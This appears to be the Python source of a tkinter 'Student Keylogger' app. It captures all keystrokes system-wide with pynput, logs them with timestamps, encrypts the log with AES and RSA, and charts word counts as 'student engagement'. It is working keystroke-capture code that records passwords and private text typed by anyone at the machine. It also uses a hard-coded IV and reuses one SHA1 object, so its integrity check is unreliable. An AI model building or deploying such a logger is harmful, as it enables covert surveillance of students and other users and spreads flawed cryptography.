
###############################################################
from tkinter import ttk
from tkinter import *
import tkinter as tk
import threading
from pynput.keyboard import Key, Listener
from datetime import datetime
import hashlib
import os
import re
from collections import Counter
import matplotlib.pyplot as plt
import time
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from tkinter.filedialog import askopenfilename
from tkinter import messagebox as mb
##################################################################




                     
recording = False
running = False
count = 0
keys = []


BLOCK_SIZE = 65536                                                      # 64KB block size
fileh = hashlib.sha1()                                                  # Hashing technique defined

# Creates thread for the keyboard listener
def start_listener_thread():
    global recording                                                    # Global variable recording set
    recording = True                                                    # Boolean True
    global running                                                      # Global variable running set
    if running != True:                                                 # if it is not = to true start the thread (default is false)
        t = threading.Thread(target=start_listener)                     # Creates thread which targets the listener function
        t.daemon = True                                                 # Thread enables daemon
        t.start()                                                       # Thread starts

# PynPut keyboard listener function
def start_listener():
    global running                                                      # Global variable running
    recording = True
    start.config(text="Recording")                                      # If listener is running, edits label to show "Recording"
    running = True                                                      # Variable check to make sure running is set True
    with Listener(on_press=on_press) as listener:                       # Creates control flow for keyboard listener
        listener.join()                                                 # Returns string from listener
        
# Function that terminates Keystroke Logging
def stop_recording():
    global recording                                                    # Global variable for recording
    start.config(text="Not Recording")                                  # Sets label to "not recording", shows capture has stopped
    recording = False                                                   # Returns false, which tells listener to stop
    with open('log.txt','rb') as f:                                     # Reads bytes of log file which has been produced
        fb = f.read(BLOCK_SIZE)                                         # Reads file by block size (64kb)
        while len(fb) > 0:                                              # While statement checks if length is greater than 0
            fileh.update(fb)                                            # Updates as every new block is read in as 64kb chunks
            fb = f.read(BLOCK_SIZE)                                     # Reads next block in loop
    with open('hashlog.txt','w') as wf:                                 # Creates a text file to write to
        wf.write(fileh.hexdigest())                                     # Hashes the data using hexdigest, than writes to file
    AESkey = os.urandom(16)                                             # Returns a random string by byte length 16. Suitable for cryptographic use
    iv = 'IV12345678912345'                                             # Initialization vector is predefined to be 16 bytes long
    obj = AES.new(AESkey, AES.MODE_CBC, IV=bytes(iv,encoding='utf-8'))  # Creates AES encryption object. Using random key, block cipher mode and IV in bytes
    with open('log.txt','rb') as ef:                                    # Reads bytes of log file
        data = ef.read()                                                # Sets data variable to byte data from file
    ciphertext = obj.encrypt(pad(data,AES.block_size))                  # Encrypts the data and pads to fit correct byte size for AES encryption
    with open('log.enc','wb') as wef:                                   # Creates encrypted log file, with writable bytes property
        wef.write(ciphertext)                                           # Writes encrypted log file to log.enc
    with open('public.pem','rb') as k:                                  # Opens public key file 
        KeyE = RSA.importKey(k.read())                                  # Reads public key using RSA, encoded in standard form
    cipher = Cipher_PKCS1_v1_5.new(KeyE)                                # Creates cipher object using PKCS1 and public key
    encrypted = cipher.encrypt(AESkey)                                  # Encrypts the AES key using RSA encryption
    with open('EncryptedKey.enc','wb') as bf:                           # Creates encryption key file.
        bf.write(encrypted)                                             # Writes encryption key to encryption key file
    
    
# Function that writes key strokes to log file.
def write_file(keys):
    global recording                                                    # Creates global variable recording                    
    global counter                                                      # Creates global variable counter
    dictkeys = {"Key.space" : ' ',"Key.shift" : '',                     # Creates a dictionary of keys. Record no/differnt value        
                "Key.ctrl_l" : '', "Key.ctrl_r" : '',
               "Key.backspace" : '',"Key.tab": '\t',
                "Key.delete" : '', "Key.caps_lock" : '',
                "Key.up" : '',"Key.down" : '',"Key.left" : '',
                "Key.right" : '',"Key.menu" : '',"Key.cmd_r" : '',
                "Key.alt_r" : '',"Key.esc" : '',"Key.alt_l" : '',
                "Key.f1" : '',"Key.f2" : '',"Key.f3" : '',
                "Key.f4" : '',"Key.f5" : '',"Key.f6" : '',
                "Key.f7" : '',"Key.f8" : '',"Key.f9" : '',
                "Key.f10" : '',"Key.f11" : '',"Key.f12" : '',
                "Key.print_screen" : ' Capture Taken ',
                "Key.scroll_lock" : '',"Key.pause" : '',
                "Key.page_up" : '',"Key.page_down" : '',"Key.end" : '',
                "Key.home" : '',"Key.insert" : '',"Key.shift_r" : '',
                "Key.num_lock" : '',}
    if recording == True:                                               # Boolean statmenet if true, allows keystroke to be recorded
        with open("log.txt", "a") as f:                                 # Opens log file as an appendable file
            for key in keys:                                            # Loops keys for the key stroke
                k = key                                                 # Sets key to k
                if k == 'Key.enter':                                    # If the enter key is pressed
                    f.write(os.linesep)                                 # Insert a blank line to immitate and enter key press
                    f.write(format_date())                              # Add date
                else:
                    if k in dictkeys:                                   # If the key is in the dictionary of key
                        f.write(dictkeys[k])                            # Write rule specified in dictionary
                    else:
                        f.write(k)                                      # Else write the key to the file
                    
 # Function to create custome date formatting                   
def format_date():
    date = str(datetime.now())                                          # Sets date variable to current system date and time
    time = date.split(" ")[1].split(".")[0]                             # Splits tim variable with space and .
    seperated_dates = date.split(" ")[0].split("-")                     # Splits date with sapce and -
    return str(seperated_dates[2] + "-" + seperated_dates[1] + "-" + seperated_dates[0] + " : " + time + " : ") # Returns final string date format. Date than time, with seperators


# Function that decrypts the log file
def decryption():
    iv = 'IV12345678912345'                                             # Sets orginal 16byte IV
    privatekey = askopenfilename(title="Select Private Key",filetypes=[("All Files","*.*")]) # Dialogue box to select privatekey
    with open(privatekey,'rb') as h:                                    # Opens private key and reads bytes
        pkey = RSA.importKey(h.read())                                  # Uses RSA importkey to read private key in correct formatting
    decipher = Cipher_PKCS1_v1_5.new(pkey)                              # Creates decipher object with private key for RSA
    encryptedkey = askopenfilename(title="Select Encrypted Key",filetypes=[("All Files","*.*")]) # Dialouge box to select encrypted key
    with open(encryptedkey,'rb') as hf:
        message = hf.read()                                             # Reads encrypted key data
    decrypted = decipher.decrypt(message, None)                         # Applies RSA deryption to encrypted key
    encryptedfile = askopenfilename(title="Select Encrypted Log File",filetypes=[("All Files","*.*")]) # Dialouge box to select encrypted log file
    with open(encryptedfile,'rb') as rf:
        ciphertext = rf.read()                                          # Reads encrypted log file
    obj2 = AES.new(decrypted,AES.MODE_CBC,IV=bytes(iv,encoding='utf-8'))# Creates AES decryption object using decrypted RSA AES encryption key
    ciphertext = unpad(obj2.decrypt(ciphertext), AES.block_size)        # Applies decipher to encrypted file, unpads AES blocksize. Removing padding
    with open('Decrypted-Log.txt','wb') as wff:                         # Creates a decrypted log file 
        wff.write(ciphertext)                                           # Writes decrypted log data to file
        with open('Decrypted-Log.txt','rb') as lgg:                     # Opens the decrypted log file again
            fb = lgg.read(BLOCK_SIZE)                                   # Reads by 64kb block size
            while len(fb) > 0:                                          # While loop to read block by block
                fileh.update(fb)                                        # Updates read with new block
                fb = lgg.read(BLOCK_SIZE)                               # Reads next chunk/block
    with open('DecryptHash.txt','w') as wf:                             # Creates a decrypted hash log text file
        wf.write(fileh.hexdigest())                                     # Writes generated SHA1 HASH for decrypted log file


# Function for on press of key
def on_press(key):
    global keys, count                                                  # Makes keys and count a global variable
    keys.append(str(key).replace("'",""))                               # Appends key variable and removes "," with blank space
    count += 1                                                          # Adds 1 to counter
    if count >= 5:                                                      # After 5 keys, the data will be wrote to log file
        count = 0                                                       # Count is reset 
        write_file(keys)                                                # Keys are wrote to file
        keys = []                                                       # Resets the key variable to empty
date = format_date()                                                    # Out of function date format

# Function to display help screen
def menuhelp():
    top = Toplevel()                                                    # Creates window at top
    top.title=("Help")                                                  # Sets title for window
    top.geometry("615x801")                                             # Sets size for window
    render = PhotoImage(file='Help.png')                                # Renders an image of the help menu on the window
    top.img = Label(top,image=render)                                   # Places it within a label to bew viewed
    top.img.image = render                                              # Renders imagine within the label on the top window
    top.img.place(x=0,y=0)                                              # Places it top left

# Function to generate bar graph
def Graph():
    dictdates = {}                                                      # Empty dictionary
    x=[]                                                                # Empty X value list item
    y=[]                                                                # Empty Y value list item

    with open('log.txt','r') as file:                                   # Opens log file and reads data within
        lines = file.readlines()                                        # Reads line by line within file
        for line in lines:                                              # For loop for each line
            
            parts = line.split(':')                                     # Splits words where it finds a ":"
            words = parts[4:]                                           # Anything pos 4 is words
            date = parts[:-3]                                           # Anything pos -3 is date                                        
            if len(words) > 0:                                          # If statement to calculate numbeer of words using length
                date = line.split(' ')[0]                               # Creates split data between spaces to show new word
                numberofwords = len(line.split(' ')[4:])                # Anything past pos 4 with space is counted as number of words
                if date not in dictdates:                               # Logs date
                    dictdates[date] = numberofwords                     # Creates new date with number of dates
                else:
                    dictdates[date] += numberofwords                    # Adds number of words to alreayd date found in dict dates
           

    
    plt.bar(list(dictdates.keys()),list(dictdates.values()), label='Number of words over Time') # plots keys over values
    plt.xlabel('Dates')                                                 # X is the dates
    plt.ylabel('Number of words')                                       # Y is number of words
  
    plt.title('Student Engagement')                                     # Title of bar graph
    plt.legend()                                                        # Auto labels
    plt.show()                                                          # Shows plot

# Function for pie graph
def pygraph():
    with open('log.txt','r') as file:                                   # Opens log file
        lines = file.readlines()                                        # Reads lines
        words = []
        for line  in lines:                                             # Loops each line
            parts = line.split(':')                                     # Defines seperator
            words += [' '.join(parts[4:]).strip()]                      # Splits words
            date = parts[:-3]
            fullword = re.findall(r'\w+', str(words))                   # Finds all words
    word_count = Counter(fullword)                                      # Creates counted list of words
    print(word_count)
    x,y = zip(*word_count.most_common(5))                               # Grabs values of 5 most common words
    plt.pie(y,labels=x,autopct='%1.1i%%')                               # Plots on pie chart
    plt.title('Student Engagement. Percentage of keywords')             # Title
    plt.show()                                                          # Shows pie chart
    
    
     
    

# Function to compare inital hash with decrypted hash, to see changes
def HashComparison():
    hashkey1 = askopenfilename(title="Select student Hash Key",filetypes=[("All Files","*.*")]) # Dialouge box asks user to select inital hash key
    hashkey2 = askopenfilename(title="Select staff Hash Key",filetypes=[("All Files","*.*")]) # Dialouge box asks user to select decrypted hash key
    file1 = open(hashkey1,'r')                                          # Opens file and reads data
    file2 = open(hashkey2,'r')                                          # Opens file and reads data
    for line1 in file1:                                                 # For loop Gets line in file 1
        for line2 in file2:                                             # For loop Gets line in file 2
            if line1==line2:                                            # == Comparison of content
                mb.showinfo('Success','Hash Identical')                 # Displays dialouge box if hashes are the same
            else:
                mb.showinfo('Error','Hash differnt')                    # Displays error. Somethings not the same
    file1.close()                                                       # Closes file
    file2.close()                                                       # Closes file

# Function for time label
def tick():
   time_string = time.strftime('%H:%M:%S')                              # Gets current system time
   clock.config(text=time_string)                                       # Configures clock label to display time
   clock.after(200,tick)                                                # Changes after 200 miliseconds

#########################################################################################################################################################
win = tk.Tk()                                                           # Win variable declares tkinter
win.title("Keylogger")                                                  # Titles tkinter GUI
win.configure(background='black')                                       # Sets background to black

win.minsize(width=300,height=50)                                        # Sets window size
win.maxsize(width=300,height=50)                                        # Sets window size

win.resizable(0,0)                                                      # Removes resizeablility 

menubar = Menu(win)                                                     # Creates a taskbar menu for the window

filemenu = Menu(menubar, tearoff=0)                                     # Creates filemenu
filemenu.add_command(label="Quit",command=win.destroy)                  # Creates quit button within menu to close window
menubar.add_cascade(label="File", menu=filemenu)                        # Creates cascade for File menu

optionmenu = Menu(menubar, tearoff=0)                                   # Creates a new object menu
optionmenu.add_command(label="Help",command=menuhelp)                   # Adds help menu to execute help function
optionmenu.add_command(label="BarGraph",command=Graph)                  # Creates graph menu to execute graph function
optionmenu.add_command(label="PieGraph",command=pygraph)                  # Creates graph menu to execute graph function
optionmenu.add_command(label="Decryption",command=decryption)           # Creates decryption menu to execute decryption function
optionmenu.add_command(label="Hash Comparison",command=HashComparison)  # Creats hash comparison menu to execute hash comparison function
menubar.add_cascade(label="Options",menu=optionmenu)                    # Cascades off option menu

action = ttk.Button(win, text="Start",command=start_listener_thread).place(x=0,y=25,height=25,width=150) # Creates tkinter button to start keylogger thread
action = ttk.Button(win, text="Stop", command=stop_recording).place(x=150,y=25,height=25,width=150) # Creates button to terminate keylogger

tk.Label(win,text="Student Keylogger",font="Times").place(x=0,y=0,width=300) # Creates TKINTER label for program
clock = Label(win,font=('times',10))                                    # Sets font of clock
clock.grid(row=0,column=0)                                              # Places clock far left
start = Label(win,text='Not Recording',font=('times',6))                # Sets label to not recording applies font
start.place(x=240,y=0)                                                  # Places recording label on right
tick()                                                                  # Ticks clock
win.config(menu=menubar)                                                # Configures window to include menu bar
win.mainloop()                                                          # Closes tkinter window loop
